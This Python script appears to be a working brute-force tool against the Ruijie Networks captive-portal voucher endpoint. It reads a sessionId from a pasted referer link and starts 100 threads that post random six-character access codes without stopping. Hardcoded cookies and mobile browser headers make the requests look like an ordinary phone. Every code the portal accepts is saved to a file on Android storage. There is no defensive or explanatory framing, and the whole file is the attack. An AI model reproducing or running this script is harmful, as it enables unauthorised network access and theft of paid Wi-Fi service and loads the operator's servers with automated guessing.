import requests
import random
import string
import time
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor

# Define storage path for Android
FILE_PATH = "/storage/emulated/0/codes.txt"

# Define cookies for session handling
cookies = {
    '_clck': '163b1wn%7C2%7Cfs0%7C0%7C1820',
    '_gcl_au': '1.1.271739863.1735099201',
    '_lfa': 'LF1.1.158765ae06dab1fc.1735099203445',
    '_fbp': 'fb.1.1735099203714.111500295180928563',
    '_ga_M2250K2XYH': 'GS1.1.1735098829.1.1.1735099263.0.0.0',
    '_ga_FVCKXTJ1DT': 'GS1.2.1735099203.1.1.1735100221.0.0.0',
    '_ga_LV5ED17YPP': 'GS1.1.1735099201.1.1.1735100482.58.0.342975901',
    '_ga_154YT3Y928': 'GS1.1.1735099202.1.1.1735100482.60.1.573480082',
    '_ga': 'GA1.2..1256420044.1735098830',
}

# Prompt the user for the referer link
referer_link = input("Enter the referer link: ")

# Parse the sessionId from the referer link
parsed_url = urlparse(referer_link)
query_params = parse_qs(parsed_url.query)
session_id = query_params.get('sessionId', [None])[0]

if not session_id:
    print("Error: sessionId not found in the referer link. Exiting.")
    exit(1)

# Define headers for the request
headers = {
    'authority': 'portal-as.ruijienetworks.com',
    'accept': '*/*',
    'content-type': 'application/json',
    'origin': 'https://portal-as.ruijienetworks.com',
    'referer': referer_link,
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

# Define query parameters
params = {'lang': 'en_US'}

# User input for code generation
print("Choose the access code type:")
print("(1) Numbers (0-9)")
print("(2) Lowercase letters (a-z)")
print("(3) Numbers and lowercase letters (0-9 and a-z)")
print("(4) Custom range (e.g., 'abcd1234')")
choice = int(input("Enter your choice (1-4): "))

# Initialize code generation based on choice
if choice == 1:
    char_range = string.digits
elif choice == 2:
    char_range = string.ascii_lowercase
elif choice == 3:
    char_range = string.ascii_lowercase + string.digits
elif choice == 4:
    char_range = input("Enter your custom range (e.g., 'abcd1234'): ")
    if not char_range:
        print("Invalid custom range. Exiting.")
        exit(1)
else:
    print("Invalid choice. Exiting.")
    exit(1)

# Function to send requests and save successful codes
def send_request(index):
    while True:
        access_code = ''.join(random.choices(char_range, k=6))
        json_data = {
            'accessCode': access_code,
            'sessionId': session_id,
            'apiVersion': 1,
        }

        try:
            response = requests.post(
                'https://portal-as.ruijienetworks.com/api/auth/voucher/',
                params=params,
                cookies=cookies,
                headers=headers,
                json=json_data,
                timeout=5
            )
            response.raise_for_status()

            print(f"Thread {index}: Access Code: {access_code} - Status: {response.status_code}")
            print(f"Response Body: {response.text}\n")

            # Check if the response contains "true"
            if "true" in response.text:
                with open(FILE_PATH, "a") as file:
                    file.write(f"{access_code}\n")
                print(f" Access code {access_code} saved to {FILE_PATH}")

        except requests.exceptions.RequestException as e:
            print(f"Thread {index} failed: {e}")

        time.sleep(0.1)  # Small delay to prevent excessive server load

# Number of threads (Adjust based on system performance)
num_threads = 100

# Using ThreadPoolExecutor for multi-threading
with ThreadPoolExecutor(max_workers=num_threads) as executor:
    for i in range(num_threads):
        executor.submit(send_request, i)
